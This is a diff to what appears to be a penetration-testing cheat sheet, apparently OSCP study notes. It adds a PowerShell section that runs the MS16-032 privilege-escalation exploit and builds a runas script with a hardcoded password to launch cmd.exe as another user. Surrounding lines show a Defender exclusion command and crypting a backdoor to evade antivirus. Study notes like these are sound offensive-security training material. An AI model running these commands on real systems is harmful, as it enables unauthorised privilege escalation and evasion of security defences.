@@ -11,6 +11,7 @@
 * [Transfer files](#Transfer-files)
 * [Process](#Process)
 * [Bypassing AV](#Bypassing-AV)
+* [Powershell](#Powershell)
 * [Automated Tools](#Automated-Tools)
 * [Resources](#Resources)
 * [Nothing is working --> SOS](#nothing-is-working----sos)
@@ -458,6 +459,26 @@ $ wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe
 C:\>powershell -exec bypass - "Add-MpPreference -ExclusionPath 'D:\EvilFolder\Tools'"
 ```
 
+[Back](#summary)
+
+## Powershell
+* powershell
+MS16-032 https://www.exploit-db.com/exploits/39719/
+```
+powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
+```
+
+* Powershell runas
+```
+* [owershell RunAS](https://github.com/gammathc/oscp_material/blob/master/oscp_notes.txt)
+
+echo $username = 'ftp' > runas.ps1
+echo $securePassword = ConvertTo-SecureString "foobar23" -AsPlainText -Force  >> runas.ps1
+echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
+echo $script = 'c:\windows\system32\cmd.exe' >> runas.ps1
+echo Start-Process -WorkingDirectory 'C:\Windows\System32' -FilePath $script  -Credential $credential  >> runas.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File runas.ps1
+```
 [Back](#summary)
 
 ## Automated Tools
